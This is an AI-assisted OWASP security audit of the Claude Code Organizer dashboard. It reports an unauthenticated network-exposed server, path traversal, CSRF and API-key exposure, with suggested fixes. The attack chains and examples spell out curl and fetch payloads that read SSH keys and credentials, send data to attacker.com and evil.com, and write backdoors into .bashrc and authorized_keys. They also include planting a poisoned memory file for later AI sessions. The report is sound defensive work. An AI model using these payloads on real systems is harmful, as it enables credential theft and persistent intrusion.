# Security Audit Report: Claude Code Organizer v0.9.1

**Date:** 2026-03-26
**Auditor:** Claude (AI-assisted)
**Methodology:** OWASP Top 10 (2021) + manual code review
**Scope:** Full codebase — all HTTP APIs, MCP tools, filesystem operations, frontend code

---

## Table of Contents

1. [What This Report Is](#what-this-report-is)
2. [How This App Works (Architecture)](#how-this-app-works)
3. [Quick Reference: What Is OWASP?](#what-is-owasp)
4. [Summary Dashboard](#summary-dashboard)
5. [Attack Chain Analysis](#attack-chain-analysis)
6. [Findings — Critical Severity](#critical-severity)
7. [Findings — High Severity](#high-severity)
8. [Findings — Medium Severity](#medium-severity)
9. [Findings — Low Severity](#low-severity)
10. [Informational Findings](#informational-findings)
11. [What The App Does Well](#what-the-app-does-well)
12. [Recommended Fix Order](#recommended-fix-order)
13. [Glossary](#glossary)

---

## What This Report Is

This is a security audit of **claude-code-organizer**, a Node.js tool that provides a web dashboard and MCP server for managing Claude Code configuration files (memories, skills, MCP servers, hooks, etc.).

The audit examines every line of source code for security vulnerabilities — weaknesses that could allow an attacker to read private data, modify files, crash the application, or otherwise cause harm. Each finding is rated by severity (how bad it would be if exploited) and mapped to the OWASP Top 10 — an industry-standard list of the most common and dangerous web application security risks.

**No automated scanning tools were used.** Every finding comes from manually reading the source code and tracing how data flows from user input through the application to the filesystem and back.

---

## How This App Works

Understanding the architecture helps you understand why each vulnerability matters.

```
┌──────────────────────────────────────────────────────────────────────┐
│                         Your Computer                                │
│                                                                      │
│  ┌─────────────┐     HTTP requests     ┌──────────────────────┐     │
│  │  Browser     │ ◄──────────────────► │  Node.js HTTP Server  │     │
│  │  (app.js)    │   localhost:3847      │  (server.mjs)         │     │
│  └─────────────┘                       └──────┬───────────────┘     │
│                                                │                     │
│                                    ┌───────────┼───────────┐        │
│                                    │           │           │        │
│                              ┌─────▼──┐  ┌────▼───┐  ┌───▼────┐   │
│                              │scanner │  │ mover  │  │tokenizer│   │
│                              │.mjs    │  │.mjs    │  │.mjs     │   │
│                              └───┬────┘  └───┬────┘  └─────────┘   │
│                                  │           │                      │
│                              ┌───▼───────────▼────┐                │
│                              │   ~/.claude/        │                │
│                              │   (your config      │                │
│                              │    files, secrets,   │                │
│                              │    MCP API keys)     │                │
│                              └────────────────────┘                │
│                                                                      │
│  ┌─────────────┐      stdio (MCP)      ┌──────────────────────┐    │
│  │  AI Client   │ ◄──────────────────► │  MCP Server           │    │
│  │  (Claude,    │                       │  (mcp-server.mjs)     │    │
│  │   Cursor)    │                       └──────────────────────┘    │
│  └─────────────┘                                                     │
└──────────────────────────────────────────────────────────────────────┘
```

**Key components:**
- **`src/server.mjs`** — The HTTP server. It has 12 API endpoints (URLs) that the browser calls. It can read, write, move, and delete files.
- **`src/scanner.mjs`** — Scans your `~/.claude/` directory to find all configuration items.
- **`src/mover.mjs`** — Moves and deletes configuration files on disk.
- **`src/mcp-server.mjs`** — An alternative interface for AI clients (like Claude Code itself) to call the same scan/move/delete functions.
- **`src/ui/app.js`** — The frontend JavaScript that runs in your browser and makes API calls to the server.
- **`bin/cli.mjs`** — The command-line entry point that starts either the web server or the MCP server.

**What's at stake:** The `~/.claude/` directory contains your memories, skills, MCP server configurations (which often include API keys like `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, database passwords), and session transcripts (which may contain sensitive code or conversations).

---

## What Is OWASP?

**OWASP** (Open Worldwide Application Security Project) maintains the **Top 10** — a list of the most critical security risks in web applications. Think of it as the "top 10 ways hackers break into web apps." Here are the categories relevant to this audit:

| Code | Name | Plain English |
|------|------|---------------|
| **A01** | Broken Access Control | The app lets people do things they shouldn't be allowed to do |
| **A02** | Cryptographic Failures | Sensitive data isn't properly protected (exposed in plaintext) |
| **A03** | Injection | User input gets treated as commands or code |
| **A04** | Insecure Design | The architecture itself has fundamental safety gaps |
| **A05** | Security Misconfiguration | Default settings are insecure (e.g., debug mode left on) |
| **A06** | Vulnerable Components | Using third-party code with known security holes |
| **A07** | Authentication Failures | No login required, or login can be bypassed |
| **A08** | Data Integrity Failures | Data from untrusted sources isn't verified (e.g., no checksums on downloaded scripts) |

**Severity ratings** used in this report:

| Level | Meaning | Example |
|-------|---------|---------|
| **Critical** | An attacker can compromise the system with minimal effort | Anyone on your WiFi can read/write your files |
| **High** | Significant damage is possible with a realistic attack | A malicious webpage can delete your config |
| **Medium** | Damage is possible but requires specific conditions | API keys visible if combined with another bug |
| **Low** | Minor risk, or the attack is theoretical/unlikely | A code pattern that could become dangerous if refactored wrong |
| **Info** | Not a vulnerability, but a best-practice gap | No activity logging |

---

## Summary Dashboard

| Severity | Count | Status |
|----------|-------|--------|
| Critical | 1 | Must fix immediately |
| High | 6 | Fix before any public deployment |
| Medium | 6 | Fix in short term |
| Low | 4 | Fix when convenient |
| Info | 6 | Nice to have |

**Overall Risk Level: HIGH**

The combination of "server open to the network" + "no authentication" + "can read/write any file in your home directory" means that **anyone on your WiFi network, and any malicious webpage you visit, can silently read your API keys and write to files like `~/.bashrc` or `~/.ssh/authorized_keys`**.

---

## Attack Chain Analysis

Individual vulnerabilities are assessed in isolation throughout this report. But the most dangerous risk in this codebase comes from **three vulnerabilities that combine into a complete, end-to-end attack** requiring no user interaction, no elevated privileges, and no special knowledge beyond a basic network scanner.

This section describes both attack paths in full.

---

### Attack Chain A: Local Network Attacker (No Browser Required)

**Vulnerabilities used:** VULN-001 + VULN-003 + VULN-002

**Prerequisites:** Attacker is on the same WiFi or LAN as the victim. Victim has claude-code-organizer running.

```
Step 1: Discovery
┌─────────────────────────────────────────────────────────┐
│  VULN-001 enables this step                             │
│                                                         │
│  Server binds to 0.0.0.0 → visible to entire network   │
│                                                         │
│  Attacker runs: nmap -p 3800-3900 192.168.1.0/24        │
│  Result: 192.168.1.42:3847 open (Claude Code Organizer) │
└─────────────────────────────────────────────────────────┘
                          │
                          ▼
Step 2: Reconnaissance
┌─────────────────────────────────────────────────────────┐
│  VULN-001 + VULN-003 enable this step                   │
│                                                         │
│  No auth required. Attacker calls /api/scan:            │
│                                                         │
│  curl http://192.168.1.42:3847/api/scan                 │
│                                                         │
│  Response contains:                                     │
│   - All memory files and their contents                 │
│   - All MCP server configs including env vars           │
│     (ANTHROPIC_API_KEY, OPENAI_API_KEY, DB passwords)   │
│   - All project directory paths                         │
│   - Session transcript metadata                         │
└─────────────────────────────────────────────────────────┘
                          │
                          ▼
Step 3: Targeted File Exfiltration
┌─────────────────────────────────────────────────────────┐
│  VULN-001 + VULN-003 enable this step                   │
│                                                         │
│  isPathAllowed() permits any file under HOME.           │
│  Attacker reads known high-value targets:               │
│                                                         │
│  curl "http://192.168.1.42:3847/api/file-content        │
│        ?path=/home/victim/.ssh/id_rsa"                  │
│                                                         │
│  curl "http://192.168.1.42:3847/api/file-content        │
│        ?path=/home/victim/.aws/credentials"             │
│                                                         │
│  curl "http://192.168.1.42:3847/api/file-content        │
│        ?path=/home/victim/myproject/.env"               │
└─────────────────────────────────────────────────────────┘
                          │
                          ▼
Step 4: Persistence (Optional — Escalation to Full System Compromise)
┌─────────────────────────────────────────────────────────┐
│  VULN-001 + VULN-002 + VULN-003 enable this step        │
│                                                         │
│  /api/restore writes any file to any path under HOME.   │
│                                                         │
│  Attacker adds their SSH key to authorized_keys:        │
│                                                         │
│  curl -X POST http://192.168.1.42:3847/api/restore \    │
│    -H "Content-Type: application/json" \                │
│    -d '{                                                │
│      "filePath": "/home/victim/.ssh/authorized_keys",   │
│      "content": "ssh-rsa ATTACKER_PUBLIC_KEY",          │
│      "isDir": false                                     │
│    }'                                                   │
│                                                         │
│  Attacker now has permanent SSH access.                 │
│  Next terminal session opens a backdoor.                │
└─────────────────────────────────────────────────────────┘
```

**Time to execute:** Under 2 minutes.
**Detectability:** Zero — no logs are written (see INFO-002), no user interaction is required.
**Skill level required:** Beginner. All tools used (`nmap`, `curl`) are installed by default on most operating systems.

---

### Attack Chain B: Malicious Webpage (Victim Doesn't Need to Be on a Network)

**Vulnerabilities used:** VULN-004 + VULN-003 + VULN-002

**Prerequisites:** Victim has claude-code-organizer running AND visits a malicious webpage. The attacker doesn't need to be on the same network — they only need to get the victim to visit a URL (phishing email, compromised ad, malicious GitHub comment, etc.).

```
Step 1: Victim Visits Malicious Page
┌─────────────────────────────────────────────────────────┐
│  Attacker publishes a webpage with hidden JavaScript.   │
│  Victim opens it via a phishing email, ad, or link.     │
│  The page appears normal — a blog post, a tool, etc.    │
│                                                         │
│  Invisible to the victim, the page runs:                │
│                                                         │
│  // The browser automatically adds the victim's         │
│  // cookies and can reach localhost — the server has    │
│  // no way to distinguish this from a real request.     │
│  // This is VULN-004 (no Origin/CSRF validation).       │
└─────────────────────────────────────────────────────────┘
                          │
                          ▼
Step 2: Silent Reconnaissance
┌─────────────────────────────────────────────────────────┐
│  VULN-004 enables cross-origin requests to localhost.   │
│                                                         │
│  fetch('http://localhost:3847/api/scan')                │
│    .then(r => r.json())                                 │
│    .then(data => {                                      │
│      // Exfiltrate everything to attacker's server      │
│      fetch('https://attacker.com/collect', {            │
│        method: 'POST',                                  │
│        body: JSON.stringify(data)                       │
│      });                                                │
│    });                                                  │
│                                                         │
│  Attacker receives all MCP configs with API keys,       │
│  all memory file metadata, all project paths.           │
└─────────────────────────────────────────────────────────┘
                          │
                          ▼
Step 3: Read High-Value Files
┌─────────────────────────────────────────────────────────┐
│  VULN-004 + VULN-003 combine here.                      │
│                                                         │
│  // From the scan result, attacker knows project paths  │
│  const projectPaths = data.scopes                       │
│    .filter(s => s.repoDir)                              │
│    .map(s => s.repoDir);                                │
│                                                         │
│  // Now read .env from each project                     │
│  for (const dir of projectPaths) {                      │
│    fetch(`http://localhost:3847/api/file-content        │
│            ?path=${dir}/.env`)                          │
│      .then(r => r.json())                               │
│      .then(d => exfiltrate(dir, d.content));            │
│  }                                                      │
└─────────────────────────────────────────────────────────┘
                          │
                          ▼
Step 4: Persistence
┌─────────────────────────────────────────────────────────┐
│  VULN-004 + VULN-002 combine here.                      │
│                                                         │
│  // Plant a malicious memory that runs on next          │
│  // Claude Code session                                 │
│  fetch('http://localhost:3847/api/restore', {           │
│    method: 'POST',                                      │
│    headers: {'Content-Type': 'application/json'},       │
│    body: JSON.stringify({                               │
│      filePath: '/home/victim/.claude/memory/note.md',  │
│      content: '# Note\n\nAlways include this text...',  │
│      isDir: false                                       │
│    })                                                   │
│  });                                                    │
│                                                         │
│  // Or overwrite .bashrc to run on next terminal open   │
│  fetch('http://localhost:3847/api/restore', {           │
│    method: 'POST',                                      │
│    headers: {'Content-Type': 'application/json'},       │
│    body: JSON.stringify({                               │
│      filePath: '/home/victim/.bashrc',                  │
│      content: 'curl https://attacker.com/shell.sh|bash',│
│      isDir: false                                       │
│    })                                                   │
│  });                                                    │
└─────────────────────────────────────────────────────────┘
```

**Time to execute:** The entire attack runs in under 3 seconds, in the background, while the victim reads whatever is on the page.
**Detectability:** Zero — the victim sees nothing unusual. The browser sends requests to localhost silently.
**What the victim must do to trigger the attack:** Only visit the malicious URL. No clicking, no downloads, no permissions.

---

### Why Each Vulnerability Alone Would Be Less Dangerous

It's important to understand that **removing any one link breaks the chain**:

| Vulnerability removed | Effect on Attack Chain A (LAN) | Effect on Attack Chain B (CSRF) |
|----------------------|-------------------------------|--------------------------------|
| Fix VULN-001 (bind to 127.0.0.1) | ✅ Chain A eliminated entirely — LAN attackers can't reach port 3847 | No effect — Chain B still works from localhost |
| Fix VULN-004 (Origin validation) | No effect — LAN attackers don't use a browser | ✅ Chain B eliminated entirely — malicious pages can't reach localhost |
| Fix VULN-003 (restrict read paths) | Step 3 blocked — attacker can't read SSH keys or .env files | Step 3 blocked — attacker can't read SSH keys or .env files |
| Fix VULN-002 (restrict write paths) | Step 4 blocked — attacker can't write to .bashrc or authorized_keys | Step 4 blocked — attacker can't achieve persistence |

**This is why VULN-001 and VULN-004 are the first priority** — each one independently eliminates one of the two attack chains at the entry point, before any other vulnerability can be reached.

---

## Critical Severity

### VULN-001: Server Listens on All Network Interfaces With Zero Authentication

| Field | Value |
|-------|-------|
| **OWASP** | A01 Broken Access Control + A07 Authentication Failures |
| **File** | `src/server.mjs`, line 663 |
| **CVSS Score** | 9.1 / 10.0 |

#### What's happening

When the server starts, it calls:

```javascript
// src/server.mjs, line 663
server.listen(p, () => {
  console.log(`\nClaude Code Organizer running at http://localhost:${p}\n`);
});
```

The `server.listen(p)` call only specifies a **port number** (like `3847`). When you don't specify a **host address**, Node.js defaults to `0.0.0.0`, which means **"accept connections from everywhere"** — not just your own computer, but any device on your network.

There is also **no authentication at all** — no login, no password, no token. Anyone who can reach port 3847 gets full access.

#### Why this is dangerous

Imagine you're at a coffee shop, coworking space, or on your home WiFi. Anyone on the same network can:

1. **Open your dashboard** by navigating to `http://your-ip:3847`
2. **Read all your Claude Code configuration** including memories, skills, and MCP server settings
3. **Read any file in your home directory** using the `/api/file-content` endpoint (see VULN-003)
4. **Delete your configurations** using the `/api/delete` endpoint
5. **Write arbitrary files** to your computer using the `/api/restore` endpoint (see VULN-002)

They don't need your password. They don't need to guess anything. They just need to find port 3847.

#### How to find exposed ports (what an attacker would do)

```bash
# An attacker on your network scans for open ports:
nmap -p 3800-3900 192.168.1.0/24
# Result: 192.168.1.42:3847 open → that's your machine
```

#### Suggested fix

Add `'127.0.0.1'` as the second argument. This tells Node.js to **only accept connections from your own machine**:

```javascript
// BEFORE (insecure — accepts connections from anywhere)
server.listen(p, () => { ... });

// AFTER (secure — only your machine can connect)
server.listen(p, '127.0.0.1', () => { ... });
```

This is a **1-line change** that eliminates the most critical vulnerability.

---

## High Severity

### VULN-002: The `/api/restore` Endpoint Can Write Files Anywhere in Your Home Directory

| Field | Value |
|-------|-------|
| **OWASP** | A01 Broken Access Control |
| **File** | `src/server.mjs`, lines 422–437 |
| **CVSS Score** | 8.0 / 10.0 |

#### What's happening

The `/api/restore` endpoint is designed for "undo" — when you delete something, it saves a backup and can restore it. But it accepts **any file path** from the request:

```javascript
// src/server.mjs, lines 422-437
if (path === "/api/restore" && req.method === "POST") {
  const { filePath, content, isDir } = await readBody(req);
  if (!filePath || !filePath.startsWith("/") || !isPathAllowed(filePath)) {
    return json(res, { ok: false, error: "Invalid or disallowed path" }, 400);
  }
  // ...
  await mkdir(dirname(filePath), { recursive: true });  // Creates any directories needed
  await wf(filePath, content, "utf-8");                  // Writes whatever content you want
}
```

The check `isPathAllowed(filePath)` is supposed to prevent writing outside of safe directories. But as we'll see in VULN-003, it allows **any path under your home directory**.

#### Why this is dangerous

An attacker (or a malicious webpage — see VULN-004) can send a POST request like:

```json
{
  "filePath": "/home/you/.bashrc",
  "content": "curl http://evil.com/steal.sh | bash",
  "isDir": false
}
```

This would overwrite your `.bashrc` file (which runs every time you open a terminal) with a malicious command. Other dangerous targets:

| Target file | What happens |
|-------------|-------------|
| `~/.ssh/authorized_keys` | Attacker gets SSH access to your machine |
| `~/.bashrc` or `~/.zshrc` | Malicious code runs every time you open a terminal |
| `~/.npmrc` | Redirects npm to a malicious package registry |
| `~/.gitconfig` | Injects malicious git hooks |
| `~/.aws/credentials` | Overwrites your cloud credentials |

#### Suggested fix

Restrict writes to only the `~/.claude/` directory:

```javascript
if (!filePath || !resolved.startsWith(CLAUDE_DIR + path.sep)) {
  return json(res, { ok: false, error: "Restore only allowed within ~/.claude/" }, 400);
}
```

---

### VULN-003: Path Validation Allows Reading/Writing Any File Under Your Home Directory

| Field | Value |
|-------|-------|
| **OWASP** | A01 Broken Access Control (CWE-22: Path Traversal) |
| **File** | `src/server.mjs`, lines 45–52 |
| **CVSS Score** | 8.1 / 10.0 |

#### What's happening

The `isPathAllowed()` function is the gatekeeper for all file operations. It's supposed to prevent access to files outside the Claude Code configuration. Here's the actual code:

```javascript
// src/server.mjs, lines 45-52
function isPathAllowed(filePath) {
  const resolved = resolve(filePath);
  // Allow paths under ~/.claude/ or under any discovered project repoDir
  if (resolved.startsWith(CLAUDE_DIR + "/") || resolved === CLAUDE_DIR) return true;
  // Allow paths under HOME (covers repo dirs with .mcp.json, CLAUDE.md etc)
  if (resolved.startsWith(HOME + "/")) return true;   // ← THIS IS THE PROBLEM
  return false;
}
```

The comment says "covers repo dirs" — the intent was to allow reading files from project directories that have `.mcp.json` or `CLAUDE.md` files. But the implementation allows **everything under your home directory**. That includes:

| Path | Contains |
|------|----------|
| `~/.ssh/` | Your SSH keys |
| `~/.aws/` | AWS credentials |
| `~/.gnupg/` | GPG keys |
| `~/.config/` | Application configs |
| `~/Documents/` | Your personal files |
| Any project directory | Source code, `.env` files |

#### Attack example

```bash
# An attacker reads your SSH private key:
curl "http://your-ip:3847/api/file-content?path=/home/you/.ssh/id_rsa"

# An attacker reads your AWS credentials:
curl "http://your-ip:3847/api/file-content?path=/home/you/.aws/credentials"

# An attacker reads a project's .env file:
curl "http://your-ip:3847/api/file-content?path=/home/you/myapp/.env"
```

#### Suggested fix

Split into separate read/write checks. For reads, only allow `~/.claude/` and known project directories (which the scanner has already discovered):

```javascript
function isReadAllowed(filePath) {
  const resolved = resolve(filePath);
  if (resolved.startsWith(CLAUDE_DIR + sep) || resolved === CLAUDE_DIR) return true;
  // Only allow reads from directories the scanner has actually found
  if (cachedData?.scopes.some(s => s.repoDir && resolved.startsWith(s.repoDir + sep))) return true;
  return false;
}

function isWriteAllowed(filePath) {
  const resolved = resolve(filePath);
  // Writes are restricted to ~/.claude/ only
  return resolved.startsWith(CLAUDE_DIR + sep) || resolved === CLAUDE_DIR;
}
```

---

### VULN-004: No CSRF Protection — Any Webpage Can Attack Your Server

| Field | Value |
|-------|-------|
| **OWASP** | A01 Broken Access Control (CWE-352: Cross-Site Request Forgery) |
| **File** | `src/server.mjs`, all POST endpoints (lines 359, 383, 422, 447, 559) |
| **CVSS Score** | 7.5 / 10.0 |

#### What is CSRF?

**CSRF** (Cross-Site Request Forgery) is an attack where a malicious website tricks your browser into making requests to another site. Here's how it works:

1. You have the Claude Code Organizer running on `localhost:3847`
2. You visit a malicious website (maybe a phishing link, a compromised blog, or an ad)
3. That website contains hidden JavaScript that sends requests to `localhost:3847`
4. Your browser sends these requests happily because they're going to your own machine
5. The server processes them because it has no way to tell the difference between a request from its own UI and one from a malicious page

#### What's happening in the code

The server does **zero origin checking**. There are no CORS headers, no Origin header validation, and no CSRF tokens:

```javascript
// src/server.mjs — all POST endpoints accept requests from ANY origin

// Line 359 — Move files between scopes
if (path === "/api/move" && req.method === "POST") {
  const { itemPath, toScopeId, category, name } = await readBody(req);
  // ... no origin check, processes immediately
}

// Line 383 — Delete files
if (path === "/api/delete" && req.method === "POST") {
  const { itemPath, category, name } = await readBody(req);
  // ... no origin check, processes immediately
}

// Line 422 — Write arbitrary files (see VULN-002)
if (path === "/api/restore" && req.method === "POST") {
  const { filePath, content, isDir } = await readBody(req);
  // ... no origin check, processes immediately
}
```

#### Attack example

A malicious webpage could contain this invisible script:

```html
<!-- Attacker's webpage — you don't see any of this -->
<script>
// Step 1: Read the victim's Claude config to find API keys
fetch('http://localhost:3847/api/scan')
  .then(r => r.json())
  .then(data => {
    // Send all their MCP configs (with API keys) to attacker's server
    fetch('https://evil.com/collect', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });

// Step 2: Write a malicious file
fetch('http://localhost:3847/api/restore', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    filePath: '/home/victim/.bashrc',
    content: 'curl https://evil.com/backdoor.sh | bash',
    isDir: false
  })
});
</script>
```

The victim just visits the page. They don't click anything. They don't see anything unusual. Their API keys are stolen and a backdoor is installed.

#### Suggested fix

Check the `Origin` header on every request. The browser automatically sets this header, and it cannot be forged by JavaScript:

```javascript
function validateOrigin(req) {
  const origin = req.headers.origin || '';
  // Only allow requests from the local dashboard
  if (origin && !origin.match(/^https?:\/\/(localhost|127\.0\.0\.1)(:\d+)?$/)) {
    return false;
  }
  return true;
}

// Add to the start of handleRequest():
if (req.method === 'POST' && !validateOrigin(req)) {
  return json(res, { ok: false, error: 'Forbidden' }, 403);
}
```

---

### VULN-005: No Request Body Size Limit — Memory Exhaustion Attack

| Field | Value |
|-------|-------|
| **OWASP** | A05 Security Misconfiguration (CWE-400: Uncontrolled Resource Consumption) |
| **File** | `src/server.mjs`, lines 78–86 |
| **CVSS Score** | 7.5 / 10.0 |

#### What's happening

The `readBody()` function reads the entire HTTP request body into a string in memory, with **no limit on how large it can be**:

```javascript
// src/server.mjs, lines 78-86
async function readBody(req) {
  let body = "";
  for await (const chunk of req) body += chunk;  // ← keeps reading forever
  try {
    return JSON.parse(body);
  } catch {
    throw new Error("Invalid JSON body");
  }
}
```

#### Why this is dangerous

An attacker can send a multi-gigabyte request to any POST endpoint. Node.js will try to store the entire thing in memory, eventually running out of RAM and crashing:

```bash
# This would crash the server by exhausting memory:
curl -X POST http://localhost:3847/api/move --data-binary @/dev/urandom
```

This is a **Denial of Service (DoS)** attack — it doesn't steal data, but it crashes your server.

#### Suggested fix

Add a maximum size parameter (1 MB is more than enough for any valid request):

```javascript
async function readBody(req, maxBytes = 1_048_576) {
  let body = "";
  let received = 0;
  for await (const chunk of req) {
    received += chunk.length;
    if (received > maxBytes) {
      req.destroy();
      throw new Error("Request body too large");
    }
    body += chunk;
  }
  return JSON.parse(body);
}
```

---

### VULN-006: Unvalidated Export Directory — Files Can Be Copied Anywhere

| Field | Value |
|-------|-------|
| **OWASP** | A01 Broken Access Control (CWE-73: External Control of File Path) |
| **File** | `src/server.mjs`, lines 559–565 |
| **CVSS Score** | 7.0 / 10.0 |

#### What's happening

The `/api/export` endpoint copies all scanned configuration items to a directory of the caller's choosing. The validation only checks that the path is absolute (starts with `/`):

```javascript
// src/server.mjs, lines 559-565
if (path === "/api/export" && req.method === "POST") {
  let { exportDir } = await readBody(req);
  if (!exportDir) exportDir = join(CLAUDE_DIR, "exports");
  if (!exportDir.startsWith("/")) {
    return json(res, { ok: false, error: "Invalid exportDir (must be absolute path)" }, 400);
  }
  // Notice: NO isPathAllowed() check — proceeds to copy files
```

After this check, the endpoint creates directories and copies files to the specified location.

#### Why this is dangerous

An attacker could:
1. Export your configs to a world-readable `/tmp/` directory for later collection
2. Export to a network mount they control
3. Overwrite existing files in target directories

#### Suggested fix

Restrict exports to `~/.claude/exports/` or validate against `isPathAllowed()`:

```javascript
if (!exportDir) exportDir = join(CLAUDE_DIR, "exports");
if (!exportDir.startsWith(CLAUDE_DIR + path.sep)) {
  return json(res, { ok: false, error: "Export only allowed within ~/.claude/" }, 400);
}
```

---

### VULN-007: Error Messages Expose Internal File Paths

| Field | Value |
|-------|-------|
| **OWASP** | A05 Security Misconfiguration (CWE-209: Information Exposure Through Error) |
| **File** | `src/server.mjs`, lines 654–658 |
| **CVSS Score** | 5.3 / 10.0 |

#### What's happening

When any API endpoint throws an unhandled error, the server sends the raw error message directly to the client:

```javascript
// src/server.mjs, lines 654-658
} catch (err) {
  console.error("Error:", err.message);
  res.writeHead(500, { "Content-Type": "application/json" });
  res.end(JSON.stringify({ ok: false, error: err.message }));  // ← leaks internal details
}
```

#### Why this is dangerous

Error messages from Node.js often contain full filesystem paths, like:

```
ENOENT: no such file or directory, open '/home/simon/.claude/projects/C--Users-simon-secret-project/memory/notes.md'
```

This reveals:
- The username (`simon`)
- The full path structure
- Project names and directory layouts
- Operating system information

An attacker uses this information to plan more targeted attacks.

#### Suggested fix

Return a generic error to the client, log the full error server-side:

```javascript
} catch (err) {
  console.error("Unhandled error:", err);  // Full error in server logs
  res.writeHead(500, { "Content-Type": "application/json" });
  res.end(JSON.stringify({ ok: false, error: "Internal server error" }));  // Generic to client
}
```

Also sanitize the specific error returns in `/api/restore` (line 442) and `/api/restore-mcp` (line 466) which also include `err.message`.

---

### VULN-008: MCP Server Configurations Expose API Keys via `/api/scan`

| Field | Value |
|-------|-------|
| **OWASP** | A02 Cryptographic Failures / Sensitive Data Exposure |
| **File** | `src/scanner.mjs` (lines 486–505), `src/server.mjs` (line 132) |
| **CVSS Score** | 6.0 / 10.0 |

#### What's happening

The scanner reads `.mcp.json` files which contain MCP server configurations. These configurations often include `env` fields with API keys:

```json
{
  "mcpServers": {
    "my-server": {
      "command": "node",
      "args": ["server.js"],
      "env": {
        "ANTHROPIC_API_KEY": "sk-ant-api03-XXXXX...",
        "OPENAI_API_KEY": "sk-XXXXX...",
        "DATABASE_URL": "postgres://user:password@host:5432/db"
      }
    }
  }
}
```

The `/api/scan` endpoint returns this entire configuration object, including all environment variables, to any client that requests it:

```javascript
// src/server.mjs, lines 130-132
if (path === "/api/scan" && req.method === "GET") {
  const data = await freshScan();
  return json(res, data);  // ← includes mcpConfig with env vars
}
```

#### Why this is dangerous

Combined with VULN-001 (network-accessible server) or VULN-004 (CSRF), an attacker can harvest all API keys from your MCP server configurations with a single GET request:

```bash
curl http://your-ip:3847/api/scan | jq '.items[] | select(.category=="mcp") | .mcpConfig.env'
```

#### Suggested fix

Redact environment variable values before sending to the client:

```javascript
// When building scan results, redact env values:
if (serverConfig.env) {
  serverConfig.env = Object.fromEntries(
    Object.entries(serverConfig.env).map(([key, val]) => [key, '●●●●●●●●'])
  );
}
```

---

## Medium Severity

### VULN-009: Path Validation Broken on Windows

| Field | Value |
|-------|-------|
| **OWASP** | A01 Broken Access Control (CWE-22: Path Traversal) |
| **File** | `src/server.mjs`, lines 45–52 and lines 424, 473 |
| **CVSS Score** | 5.5 / 10.0 |

#### What's happening

The path validation has **two separate Windows bugs**:

**Bug 1:** The `isPathAllowed()` function uses forward-slash (`/`) in its comparison strings:

```javascript
// src/server.mjs, line 48
if (resolved.startsWith(CLAUDE_DIR + "/") || resolved === CLAUDE_DIR) return true;
//                                    ↑ forward slash
```

On Windows, `path.resolve()` returns paths with **backslashes** (e.g., `C:\Users\simon\.claude\memory`). The string `CLAUDE_DIR + "/"` produces `C:\Users\simon\.claude/` — note the trailing forward slash. The `startsWith` check may fail because Windows paths use `\` while the check uses `/`.

**Bug 2:** Several endpoints check `filePath.startsWith("/")` to validate paths:

```javascript
// src/server.mjs, line 424
if (!filePath || !filePath.startsWith("/") || !isPathAllowed(filePath)) {
//                         ↑ this rejects ALL Windows paths
```

On Windows, valid paths start with a drive letter like `C:\`, not `/`. This means the `/api/restore` and `/api/file-content` endpoints **silently reject all valid paths on Windows**, breaking core functionality.

#### Suggested fix

Use `path.sep` for separator-aware comparisons, and use `path.isAbsolute()` instead of `startsWith("/")`:

```javascript
import { sep, isAbsolute } from 'node:path';

function isPathAllowed(filePath) {
  const resolved = resolve(filePath);
  if (resolved.startsWith(CLAUDE_DIR + sep) || resolved === CLAUDE_DIR) return true;
  if (resolved.startsWith(HOME + sep)) return true;
  return false;
}

// In endpoint validations:
if (!filePath || !isAbsolute(filePath) || !isPathAllowed(filePath)) { ... }
```

---

### VULN-010: No Security Headers — Clickjacking and Content Sniffing

| Field | Value |
|-------|-------|
| **OWASP** | A05 Security Misconfiguration (CWE-693: Protection Mechanism Failure) |
| **File** | `src/server.mjs`, all response functions |
| **CVSS Score** | 5.0 / 10.0 |

#### What's happening

The server sends zero security headers in its HTTP responses. Security headers are instructions from the server to the browser saying things like "don't let other websites embed me" or "don't try to guess the file type."

**Missing headers and what they prevent:**

| Header | Purpose | Risk without it |
|--------|---------|-----------------|
| `X-Frame-Options: DENY` | Prevents the page from being embedded in an iframe | **Clickjacking** — an attacker puts your dashboard in an invisible iframe and tricks you into clicking "Delete" buttons |
| `X-Content-Type-Options: nosniff` | Prevents the browser from guessing file types | Browser might execute a non-JS file as JavaScript |
| `Content-Security-Policy` | Controls which scripts/styles/fonts can load | If any XSS is found, CSP limits the damage |

#### What is clickjacking?

A malicious site embeds your dashboard in an invisible iframe, then overlays fake buttons. When you think you're clicking "Play Video" on the attacker's page, you're actually clicking "Delete" on your hidden dashboard.

#### Suggested fix

Add headers to all responses by modifying the `json()` and `serveFile()` helpers:

```javascript
const SECURITY_HEADERS = {
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'DENY',
  'Content-Security-Policy': "default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com",
};

function json(res, data, status = 200) {
  res.writeHead(status, { 'Content-Type': 'application/json', ...SECURITY_HEADERS });
  res.end(JSON.stringify(data));
}
```

---

### VULN-011: External Script Loaded Without Integrity Check (Supply Chain Risk)

| Field | Value |
|-------|-------|
| **OWASP** | A08 Software and Data Integrity Failures (CWE-829: Untrusted Code) |
| **File** | `src/ui/index.html`, line 9 |
| **CVSS Score** | 5.0 / 10.0 |

#### What's happening

The dashboard loads the SortableJS library from a CDN (Content Delivery Network) without verifying its integrity:

```html
<!-- src/ui/index.html, line 9 -->
<script src="https://cdn.jsdelivr.net/npm/sortablejs@1.15.6/Sortable.min.js"></script>
```

#### What is a supply chain attack?

A **supply chain attack** is when an attacker compromises a dependency rather than attacking you directly. If jsdelivr.net (the CDN) were compromised, or if someone executed a DNS hijacking attack, they could serve a modified version of SortableJS that includes malicious code. Your browser would execute it without question.

Since this script runs on a page that has access to all your API endpoints, the injected code could do anything the dashboard can do — read files, delete configs, exfiltrate API keys.

#### What is SRI?

**SRI** (Subresource Integrity) is a browser feature where you include a hash of the expected file. The browser downloads the script and checks that its hash matches before executing it. If the CDN serves a tampered file, the hash won't match and the browser refuses to run it.

#### Suggested fix

Add an `integrity` attribute with the script's hash:

```html
<script src="https://cdn.jsdelivr.net/npm/sortablejs@1.15.6/Sortable.min.js"
  integrity="sha384-<computed-hash-goes-here>"
  crossorigin="anonymous"></script>
```

Or even better, bundle SortableJS locally (download it and serve it from your own server):

```html
<script src="/vendor/Sortable.min.js"></script>
```

---

